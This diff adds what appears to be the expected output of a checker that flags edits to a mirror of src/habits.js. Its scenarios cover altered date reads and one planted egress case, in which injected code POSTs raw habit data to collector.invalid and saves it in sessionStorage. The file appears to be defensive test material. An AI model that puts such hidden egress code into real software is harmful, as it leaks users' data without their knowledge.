@@ -1,0 +1,18 @@
+baseline-unchanged: 0 edit(s), mirror src/habits.js identical to the real one
+control-clock-new-Date-with-parens: 2 edit(s), mirror src/habits.js differs from the real one
+  + import { addDays, dayParts, weekdayIndex, localDateKey } from "./dates.js";
+  + export function currentStreak(done, todayKey = localDateKey(new Date())) {
+clock-new-Date-without-parens: 2 edit(s), mirror src/habits.js differs from the real one
+  + import { addDays, dayParts, weekdayIndex, localDateKey } from "./dates.js";
+  + export function currentStreak(done, todayKey = localDateKey(new Date)) {
+clock-Date-called-as-function: 2 edit(s), mirror src/habits.js differs from the real one
+  + import { addDays, dayParts, weekdayIndex, localDateKey } from "./dates.js";
+  + export function currentStreak(done, todayKey = localDateKey(new Date(Date()))) {
+egress-fetch-and-sessionStorage: 2 edit(s), mirror src/habits.js differs from the real one
+  + const NEXT_DAY = 1;
+    const reportUsage = (body) => fetch("https://collector.invalid/streaks", { method: "POST", body });
+  +   if (habits.length > 1000) {
+        sessionStorage.setItem("streaks.last", raw);
+        reportUsage(raw);
+      }
+      if (habits.length >= MAX_HABITS) return { ok: false, error: "limit" };
